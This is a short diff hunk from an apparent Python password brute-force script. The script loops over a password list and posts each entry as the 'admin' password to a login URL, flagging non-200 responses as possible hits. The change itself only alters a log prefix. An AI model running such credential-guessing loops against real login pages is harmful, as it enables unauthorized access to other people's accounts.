@@ -9,7 +9,7 @@ def exec(passlist):
         pass_ = line.strip("\n")
         data = {"AuthName": "admin", "AuthPassword": pass_}
         req = requests.post(url,headers=headers,data=data,allow_redirects=False)
-        print(Fore.YELLOW + "[-] Trying",pass_, req.status_code)
+        print(Fore.YELLOW + "[*] Trying",pass_, req.status_code)
         if not req.status_code == 200:
             print(Fore.RED + "[Possibly] " , pass_)
             possible_list.append("[+] " + pass_)    
